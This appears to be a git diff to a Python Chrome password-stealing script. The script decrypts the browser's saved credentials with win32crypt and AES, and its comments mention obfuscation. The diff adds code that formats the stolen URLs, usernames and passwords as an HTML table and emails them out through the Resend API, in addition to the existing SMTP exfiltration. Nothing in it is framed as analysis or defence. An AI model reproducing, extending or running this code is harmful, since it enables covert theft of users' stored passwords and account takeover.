@@ -11,7 +11,7 @@ import sqlite3
 import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
-
+import resend
 
 base_path = os.path.dirname(os.path.realpath(sys.argv[0]))
 # 方便混淆
@@ -35,7 +35,24 @@ def read_yaml(yaml_path: Union[str, Path]) -> Dict:
 
 config = read_yaml('config.yaml')
 
+
+def to_html(data):
+    html = "<table>\n"
+    html += "<tr><th>URL</th><th>Username</th><th>Password</th></tr>\n"
+
+    for item in data:
+        html += "<tr>"
+        html += "<td>{}</td>".format(item['url'])
+        html += "<td>{}</td>".format(item['username'])
+        html += "<td>{}</td>".format(item['p'])
+        html += "</tr>\n"
+
+    html += "</table>"
+    return html
+
 def email_send(title,msg):
+    if config["email"]["host"] == "" or config["email"]["user"] == "" or config["email"]["pass"] == "" or config["email"]["sender"] == "" or config["email"]["receivers"] == "":
+        return
     message = MIMEText(msg,'plain','utf-8')
     message['Subject'] = title 
     message['From'] = config["email"]["sender"]   
@@ -48,7 +65,22 @@ def email_send(title,msg):
         smtpObj.quit() 
     except Exception as e:
         print(e)
-  
+
+def resend_email(msg):
+    if config["resend"]["key"] == "":
+        return
+    msg = to_html(msg)
+    resend.api_key = config["resend"]["key"] 
+    try:
+        r = resend.Emails.send({
+            "from": config["resend"]["from"],
+            "to": config["resend"]["to"],
+            "subject": "InfoSec-GoogleChrome",
+            "html": msg 
+        })
+    except Exception as e:
+        print(e)
+
 def get_fencrypted_key():
     try:
         google_info_path = google_info_path_1 + google_info_path_2
@@ -121,8 +153,8 @@ if __name__ == '__main__':
             with open(os.path.join(base_path,"output.json"),"w",encoding="utf-8") as f:
                     json.dump(ret_list,f,ensure_ascii=False,indent=4)
         if(config["output"]["email"] == "ON"):
-           email_send('chrome',str(ret_list))
-        
+           email_send('InfoSec-GoogleChrome',str(ret_list))
+           resend_email(ret_list) 
     except:
         pass
     
